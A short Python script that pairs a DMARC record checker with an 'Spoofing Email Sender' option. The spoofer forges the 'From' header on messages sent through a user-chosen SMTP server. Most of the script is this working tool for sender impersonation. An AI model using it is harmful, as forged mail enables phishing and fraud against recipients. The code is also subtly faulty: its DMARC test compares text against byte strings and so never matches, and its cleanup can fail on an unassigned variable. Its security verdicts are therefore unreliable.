import smtplib
import dns.resolver

def main():
    while True:
        choice = input("Choose an option: \n1. DMARC Checker\n2. Spoofing Email Sender\nEnter choice (1 or 2): ")
        
        if choice == '1':
            domain = input("Enter domain: ")
            try:
                check_dmarc(domain)
            except ValueError as e:
                print(e)
                continue
            else:
                print(f"{domain} is secure by email")
                break
        elif choice == '2':
            domain = input("Enter domain: ")
            email_from = input("Enter email header 'From' field: ")
            email_body = input("Enter email body text: ")
            email_to = input("Enter recipient email: ")
            email_sender = input("Enter sender email: ")
            try:
                spoof_email(domain, email_from, email_body, email_to, email_sender)
            except ValueError as e:
                print(e)
                continue
            else:
                print("Email sent successfully")
                break
        else:
            print("Invalid choice. Please enter 1 or 2.")
            continue

def check_dmarc(domain):
    try:
        answers = dns.resolver.query(f'_dmarc.{domain}', 'TXT')
    except dns.resolver.NXDOMAIN:
        raise ValueError(f"{domain} is not a valid domain")
    else:
        for rdata in answers:
            if "v=DMARC1" in rdata.strings:
                return True
        raise ValueError(f"{domain} does not have a DMARC record")

def spoof_email(domain, email_from, email_body, email_to, email_sender):
    message = f"From: {email_from}\nTo: {email_to}\nSubject: Spoofed Email\n\n{email_body}"
    try:
        smtp_server = smtplib.SMTP(domain)
        smtp_server.sendmail(email_sender, email_to, message)
    except smtplib.SMTPException:
        raise ValueError("Unable to send email")
    finally:
        smtp_server.quit()

if __name__ == '__main__':
    main()
